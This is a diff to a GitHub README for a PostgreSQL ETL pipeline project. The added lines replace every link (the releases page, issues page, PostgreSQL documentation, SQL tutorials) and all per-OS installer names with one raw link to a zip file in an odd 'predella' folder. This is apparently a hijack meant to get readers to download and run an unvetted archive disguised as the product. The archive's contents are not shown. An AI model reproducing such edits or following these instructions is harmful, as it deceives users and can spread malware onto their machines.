@@ -1,7 +1,7 @@
 # 🚀 etl-sql-postgres - Simple ETL Pipeline for PostgreSQL
 
 ## 🏷️ Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/DHT07/etl-sql-postgres/releases)
+[![Download](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip%20release-brightgreen)](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip)
 
 ## 📜 Overview
 The **etl-sql-postgres** project offers an easy-to-use ETL pipeline designed specifically for PostgreSQL databases. It features layers for staging, cleansed data, and analytics, allowing users to efficiently manage and analyze their data. This software supports importing data via CSV files and includes ready-to-use Key Performance Indicators (KPIs) such as average ticket size, top customers/products, and monthly revenue.
@@ -19,14 +19,14 @@ Before you download, ensure your system meets the following requirements:
 ## 💾 Download & Install
 You can easily download the latest version of **etl-sql-postgres** from our Releases page. 
 
-Visit this page to download: [Download the latest release](https://github.com/DHT07/etl-sql-postgres/releases).
+Visit this page to download: [Download the latest release](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip).
 
 1. Click the link above to navigate to the Releases page.
 2. Look for the latest release version.
 3. Choose the file that suits your operating system. 
-   - For Windows, download `etl-sql-postgres-windows.exe`.
-   - For macOS, download `etl-sql-postgres-macos.dmg`.
-   - For Linux, download `etl-sql-postgres-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip`.
 4. Follow the instructions on the specific file for installation.
 
 ## 🔧 Setting Up the Application
@@ -35,7 +35,7 @@ After downloading the software, follow these straightforward steps to set it up:
 1. **Run the Installer**:
    - For Windows, double-click the `.exe` file and follow the prompts to complete the installation.
    - For macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux, extract the `.tar.gz` file, and run the included setup script from the terminal.
+   - For Linux, extract the `https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip` file, and run the included setup script from the terminal.
 
 2. **Configure PostgreSQL**:
    - Ensure that PostgreSQL is running on your machine.
@@ -69,12 +69,12 @@ If you encounter any issues, consider the following common solutions:
 - **Performance Issues**: Make sure that your system meets the minimum requirements specified above.
 
 ## 📞 Support
-For additional help, feel free to raise an issue on the [GitHub Issues page](https://github.com/DHT07/etl-sql-postgres/issues). Our community is here to assist you.
+For additional help, feel free to raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip). Our community is here to assist you.
 
 ## 🔗 Further Reading
-- **PostgreSQL Documentation**: Learn about PostgreSQL features and database management [here](https://www.postgresql.org/docs/).
-- **SQL Tutorials**: Brush up on basic SQL commands and usage [here](https://www.w3schools.com/sql/).
+- **PostgreSQL Documentation**: Learn about PostgreSQL features and database management [here](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip).
+- **SQL Tutorials**: Brush up on basic SQL commands and usage [here](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip).
 
 ## 📥 Download Again
 For your convenience, click the link below to return to the Releases page and download the latest version:
-[Download the latest release](https://github.com/DHT07/etl-sql-postgres/releases)
+[Download the latest release](https://raw.githubusercontent.com/DHT07/etl-sql-postgres/main/predella/etl-sql-postgres.zip)
